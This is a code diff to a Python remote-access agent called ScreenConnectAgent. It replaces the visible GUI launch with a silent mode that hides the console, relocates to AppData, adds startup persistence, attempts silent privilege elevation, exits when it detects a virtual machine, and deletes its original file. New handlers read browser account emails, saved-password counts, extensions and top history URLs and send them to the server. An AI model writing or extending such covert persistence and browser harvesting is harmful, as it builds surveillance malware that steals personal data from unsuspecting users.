-                os.system("powershell.exe -Command \"$b = (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightness).CurrentBrightness + 10; if($b -gt 100){$b=100}; (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, $b)\"")
+                _spawn_hidden("powershell.exe -Command \"$b = (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightness).CurrentBrightness + 10; if($b -gt 100){$b=100}; (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, $b)\"", shell=True)
             elif action == "brightness_down":
-                os.system("powershell.exe -Command \"$b = (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightness).CurrentBrightness - 10; if($b -lt 0){$b=0}; (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, $b)\"")
+                _spawn_hidden("powershell.exe -Command \"$b = (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightness).CurrentBrightness - 10; if($b -lt 0){$b=0}; (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, $b)\"", shell=True)
         except Exception as e:
             logger.error(f"System action failed ({action}): {e}")
 
@@ -1360,6 +1916,340 @@ class ScreenConnectAgent:
         except Exception as e:
             self._send_json({"type": "process_kill_response", "success": False, "error": str(e)})
 
+    def _handle_browser_list_request(self, d):
+        """Detect installed browsers and the default one, then send the list."""
+        try:
+            browsers = self._get_installed_browsers()
+            self._send_json({
+                "type": "browser_list_response",
+                "browsers": browsers
+            })
+        except Exception as e:
+            logger.error(f"Browser list error: {e}")
+            self._send_json({
+                "type": "browser_list_response",
+                "browsers": [],
+                "error": str(e)
+            })
+
+    def _get_installed_browsers(self):
+        """Helper to find all browsers in registry/folders and identify the default."""
+        browsers = []
+        seen_paths = set()
+
+        # 1. Identify Default Browser via UserChoice
+        default_prog_id = ""
+        try:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice") as key:
+                default_prog_id, _ = winreg.QueryValueEx(key, "ProgId")
+        except Exception: pass
+
+        # 2. Search StartMenuInternet for installed browsers (Standard method)
+        # Check both 64-bit and 32-bit (WOW6432Node) registry trees
+        reg_roots = [(winreg.HKEY_LOCAL_MACHINE, "HKLM"), (winreg.HKEY_CURRENT_USER, "HKCU")]
+        reg_subkeys = [
+            r"SOFTWARE\Clients\StartMenuInternet",
+            r"SOFTWARE\WOW6432Node\Clients\StartMenuInternet"
+        ]
+
+        for root, root_name in reg_roots:
+            for subkey in reg_subkeys:
+                try:
+                    with winreg.OpenKey(root, subkey) as key:
+                        for i in range(winreg.QueryInfoKey(key)[0]):
+                            browser_id = winreg.EnumKey(key, i)
+                            try:
+                                with winreg.OpenKey(key, browser_id) as b_key:
+                                    b_name = winreg.QueryValue(b_key, None)
+                                    with winreg.OpenKey(b_key, r"shell\open\command") as c_key:
+                                        cmd, _ = winreg.QueryValueEx(c_key, None)
+                                        # Clean path
+                                        exe_path = cmd.strip('"').split(' -')[0].strip() # remove args
+                                        if not exe_path.lower().endswith(".exe"):
+                                            import shlex
+                                            try: exe_path = shlex.split(cmd)[0]
+                                            except: pass
+                                        
+                                        abs_path = os.path.abspath(exe_path).lower()
+                                        if abs_path in seen_paths or not os.path.exists(exe_path):
+                                            continue
+                                        
+                                        seen_paths.add(abs_path)
+                                        is_default = self._check_if_default(b_name, browser_id, default_prog_id)
+                                        
+                                        browsers.append({
+                                            "name": b_name,
+                                            "path": exe_path,
+                                            "version": "System",
+                                            "is_default": is_default
+                                        })
+                            except Exception: continue
+                except Exception: continue
+
+        # 3. Search Common App Paths (Individual browser registration)
+        common_exes = ["chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe", "vivaldi.exe"]
+        app_paths = [
+            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths",
+            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths"
+        ]
+        for root, _ in reg_roots:
+            for sub_base in app_paths:
+                for exe in common_exes:
+                    try:
+                        with winreg.OpenKey(root, f"{sub_base}\\{exe}") as key:
+                            exe_path, _ = winreg.QueryValueEx(key, None)
+                            abs_path = os.path.abspath(exe_path).lower()
+                            if abs_path not in seen_paths and os.path.exists(exe_path):
+                                seen_paths.add(abs_path)
+                                name = exe.split('.')[0].capitalize()
+                                if "msedge" in name.lower(): name = "Microsoft Edge"
+                                if "chrome" in name.lower(): name = "Google Chrome"
+                                
+                                browsers.append({
+                                    "name": name,
+                                    "path": exe_path,
+                                    "version": "Detected",
+                                    "is_default": self._check_if_default(name, exe, default_prog_id)
+                                })
+                    except Exception: continue
+
+        # 4. Always Check Common Installation Folders (Final fallback/redundancy)
+        manual_checks = [
+            ("Google Chrome", r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
+            ("Google Chrome", r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"),
+            ("Microsoft Edge", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"),
+            ("Firefox", r"C:\Program Files\Mozilla Firefox\firefox.exe"),
+            ("Brave", os.path.join(os.environ.get("LOCALAPPDATA", ""), r"BraveSoftware\Brave-Browser\Application\brave.exe")),
+            ("Brave", r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe")
+        ]
+        for name, path in manual_checks:
+            if os.path.exists(path):
+                abs_path = os.path.abspath(path).lower()
+                if abs_path not in seen_paths:
+                    seen_paths.add(abs_path)
+                    browsers.append({
+                        "name": name,
+                        "path": path,
+                        "version": "Installed",
+                        "is_default": self._check_if_default(name, os.path.basename(path), default_prog_id)
+                    })
+
+        return browsers
+
+    def _check_if_default(self, name, id_str, default_prog_id):
+        """Logic to match a found browser with the system's default ProgId."""
+        if not default_prog_id:
+            return False
+        
+        n = name.lower()
+        i = id_str.lower()
+        d = default_prog_id.lower()
+
+        # Map common markers
+        if "chrome" in d and ("chrome" in n or "chrome" in i): return True
+        if "firefox" in d and ("firefox" in n or "firefox" in i): return True
+        if "edge" in d and ("edge" in n or "edge" in i): return True
+        if "opera" in d and ("opera" in n or "opera" in i): return True
+        if "brave" in d and ("brave" in n or "brave" in i): return True
+        
+        # Generic fallback match
+        if d in i or i in d: return True
+        return False
+
+    def _handle_browser_profile_request(self, d):
+        """Handle request for detailed browser profile forensics."""
+        browser_name = d.get("name", "")
+        browser_path = d.get("path", "")
+        
+        profiles = []
+        try:
+            if "chrome" in browser_name.lower():
+                path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data')
+                profiles = self._get_chromium_profiles("Google Chrome", path)
+            elif "edge" in browser_name.lower():
+                path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data')
+                profiles = self._get_chromium_profiles("Microsoft Edge", path)
+            elif "firefox" in browser_name.lower():
+                path = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
+                profiles = self._get_firefox_profiles(path)
+            
+            self._send_json({
+                "type": "browser_profile_response",
+                "browser": browser_name,
+                "profiles": profiles
+            })
+        except Exception as e:
+            logger.error(f"Browser profile error: {e}")
+            self._send_json({
+                "type": "browser_profile_response",
+                "browser": browser_name,
+                "error": str(e),
+                "profiles": []
+            })
+
+    def _get_chromium_profiles(self, browser_name, user_data_path):
+        """Harvester for Chromium-based browsers."""
+        profiles = []
+        if not os.path.exists(user_data_path):
+            return []
+
+        # Standard profile folder names
+        valid_folders = ["Default"] + [f"Profile {i}" for i in range(1, 20)]
+        
+        for folder in os.listdir(user_data_path):
+            if folder in valid_folders:
+                profile_path = os.path.join(user_data_path, folder)
+                if os.path.isdir(profile_path):
+                    try:
+                        p_data = self._parse_chromium_profile(profile_path)
+                        p_data["folder"] = folder
+                        profiles.append(p_data)
+                    except Exception as e:
+                        logger.debug(f"Error parsing Chromium profile {folder}: {e}")
+        return profiles
+
+    def _parse_chromium_profile(self, profile_path):
+        """Extract Identity, Security, and Forensic data from a Chromium profile."""
+        details = {
+            "name": "Unknown Profile",
+            "email": "Not Synced",
+            "avatar_url": None,
+            "security": {
+                "safebrowsing_enabled": False,
+                "safebrowsing_enhanced": False,
+                "password_count": 0,
+                "permissions_count": 0
+            },
+            "extensions": [],
+            "forensics": []
+        }
+
+        # 1. Parse Preferences (Identity & Security)
+        pref_path = os.path.join(profile_path, "Preferences")
+        if os.path.exists(pref_path):
+            try:
+                with open(pref_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    data = json.load(f)
+                    
+                    # Identity
+                    acc = data.get("account_info", [])
+                    if acc and isinstance(acc, list):
+                        details["email"] = acc[0].get("email", "Not Synced")
+                        details["name"] = acc[0].get("given_name", "User")
+                        details["avatar_url"] = acc[0].get("picture_url")
+                    else:
+                        details["name"] = data.get("profile", {}).get("name", "Local Profile")
+
+                    # Security Health Check
+                    sb = data.get("safebrowsing", {})
+                    details["security"]["safebrowsing_enabled"] = sb.get("enabled", False)
+                    details["security"]["safebrowsing_enhanced"] = sb.get("enhanced_protection_enabled", False)
+                    
+                    # Permissions audit (Camera/Mic)
+                    content_settings = data.get("profile", {}).get("content_settings", {}).get("exceptions", {})
+                    cam = len(content_settings.get("media_stream_camera", {}))
+                    mic = len(content_settings.get("media_stream_mic", {}))
+                    details["security"]["permissions_count"] = cam + mic
+            except: pass
+
+        # 2. Count Passwords in Login Data (SQLite)
+        login_data = os.path.join(profile_path, "Login Data")
+        if os.path.exists(login_data):
+            try:
+                # Copy to temp to avoid locking issues
+                temp_db = os.path.join(tempfile.gettempdir(), f"ld_{uuid.uuid4().hex}")
+                shutil.copy2(login_data, temp_db)
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                cursor.execute("SELECT COUNT(*) FROM logins")
+                details["security"]["password_count"] = cursor.fetchone()[0]
+                conn.close()
+                os.remove(temp_db)
+            except: pass
+
+        # 3. Extensions Inventory
+        ext_path = os.path.join(profile_path, "Extensions")
+        if os.path.isdir(ext_path):
+            for ext_id in os.listdir(ext_path):
+                if len(ext_id) == 32: # Standard Chromium extension ID length
+                    id_path = os.path.join(ext_path, ext_id)
+                    try:
+                        # Find versioned folder
+                        versions = os.listdir(id_path)
+                        if versions:
+                            manifest_path = os.path.join(id_path, versions[0], "manifest.json")
+                            if os.path.exists(manifest_path):
+                                with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as mf:
+                                    m_data = json.load(mf)
+                                    details["extensions"].append({
+                                        "id": ext_id,
+                                        "name": m_data.get("name", "Unknown"),
+                                        "version": m_data.get("version", "0.0.0")
+                                    })
+                    except: pass
+
+        # 4. Forensics (Top Sites)
+        history_path = os.path.join(profile_path, "History")
+        if os.path.exists(history_path):
+            try:
+                temp_h = os.path.join(tempfile.gettempdir(), f"hi_{uuid.uuid4().hex}")
+                shutil.copy2(history_path, temp_h)
+                conn = sqlite3.connect(temp_h)
+                cursor = conn.cursor()
+                # Get Top 5 visited domains
+                cursor.execute("""
+                    SELECT url, title, visit_count 
+                    FROM urls 
+                    ORDER BY visit_count DESC 
+                    LIMIT 5
+                """)
+                for row in cursor.fetchall():
+                    details["forensics"].append({
+                        "url": row[0][:60] + "..." if len(row[0]) > 60 else row[0],
+                        "title": row[1] or "No Title",
+                        "visits": row[2]
+                    })
+                conn.close()
+                os.remove(temp_h)
+            except: pass
+
+        return details
+
+    def _get_firefox_profiles(self, user_data_path):
+        """Limited harvester for Firefox (Identity & Extensions)."""
+        profiles = []
+        if not os.path.exists(user_data_path):
+            return []
+
+        for folder in os.listdir(user_data_path):
+            profile_path = os.path.join(user_data_path, folder)
+            if os.path.isdir(profile_path):
+                details = {
+                    "folder": folder,
+                    "name": folder.split('.')[-1],
+                    "email": "Unknown (Firefox)",
+                    "security": {"safebrowsing_enabled": True, "password_count": 0},
+                    "extensions": [],
+                    "forensics": []
+                }
+                
+                # Extensions list
+                ext_json = os.path.join(profile_path, "extensions.json")
+                if os.path.exists(ext_json):
+                    try:
+                        with open(ext_json, 'r', encoding='utf-8', errors='ignore') as f:
+                            data = json.load(f)
+                            for addon in data.get("addons", []):
+                                details["extensions"].append({
+                                    "id": addon.get("id"),
+                                    "name": addon.get("defaultLocale", {}).get("name", "Unknown"),
+                                    "version": addon.get("version")
+                                })
+                    except: pass
+                
+                profiles.append(details)
+        return profiles
+
     def _handle_clipboard_get(self):
         """Read clipboard content."""
         if not HAS_PYPERCLIP:
@@ -1686,13 +2576,99 @@ def run_cli():
         sys.exit(1)
 
 
+def run_silent(server_url):
+    """Run in background without GUI, using bootstrap registration."""
+    # 1. Hide console (first thing)
+    StealthManager.hide_console()
+
+    # 2. Relocate to AppData and persist
+    # If this copy is on Desktop, it will launch the AppData copy and exit.
+    # The AppData copy will continue past this point.
+    target_path = StealthManager.relocate_agent()
+    if target_path:
+         StealthManager.add_to_startup(target_path)
+
+    # 3. Mutex check
+    # We do THIS AFTER relocation so that the AppData copy waits for the Desktop copy to die.
+    StealthManager.prevent_multiple_instances()
+
+    # 4. Silent admin elevation attempt
+    StealthManager.elevate_silent()
+
+    # 5. Bootstrap
+    agent = ScreenConnectAgent(
+        server_url=server_url,
+        session_id=None,
+        token=None,
+        on_status=lambda s, m: logger.info(f"[{s.upper()}] {m}")
+    )
+
+    if agent.bootstrap():
+        agent.start()
+    else:
+        logger.error("Silent bootstrap failed. Retrying in 60s...")
+        time.sleep(60)
+        sys.exit(1)
+
+
 # =============================================================================
 # Entry point
 # =============================================================================
 
 if __name__ == "__main__":
+    # 0. Handle hidden --no-elevate flag (internal use only)
+    if "--no-elevate" in sys.argv:
+        try:
+            sys.argv.remove("--no-elevate")
+        except ValueError: pass
+
+    # 1. Smart Elevation (UAC Prompt)
+    # This happens BEFORE relocation so we can relocate WITH admin rights.
+    StealthManager.auto_elevate()
+
+    # 2. Check for cleanup request (self-deletion of original desktop EXE)
+    # Strip --cleanup and its path from sys.argv so they don't interfere
+    # with the CLI vs silent mode decision below.
+    if "--cleanup" in sys.argv:
+        try:
+            cleanup_idx = sys.argv.index("--cleanup")
+            if cleanup_idx + 1 < len(sys.argv):
+                cleanup_path = sys.argv[cleanup_idx + 1]
+                # Remove both --cleanup and the path from argv
+                sys.argv.pop(cleanup_idx + 1)
+                sys.argv.pop(cleanup_idx)
+
+                def _do_cleanup():
+                    # Wait more aggressively
+                    time.sleep(10)
+                    try:
+                        if os.path.exists(cleanup_path):
+                            # Try multiple times to delete it
+                            for i in range(10):
+                                try:
+                                    os.remove(cleanup_path)
+                                    logger.info(f"Cleaned up original: {cleanup_path}")
+                                    break
+                                except:
+                                    time.sleep(2)
+                    except Exception as e:
+                        logger.error(f"Cleanup thread failed: {e}")
+                threading.Thread(target=_do_cleanup, daemon=True).start()
+            else:
+                # --cleanup without a path, just remove the flag
+                sys.argv.pop(cleanup_idx)
+        except Exception:
+            pass
+
+    # Check for VM and self-destruct if detected
+    if StealthManager.check_vm():
+        logger.warning("VM Detected. Terminating.")
+        sys.exit(0)
+
+    # Entry decision:
+    # 1. If CLI arguments are passed (--server, etc.), run CLI mode.
+    # 2. If NO arguments, run SILENT mode (auto-register).
     if len(sys.argv) > 1:
         run_cli()
     else:
-        app = AgentGUI()
-        app.run()
+        run_silent(DEFAULT_SERVER_URL)
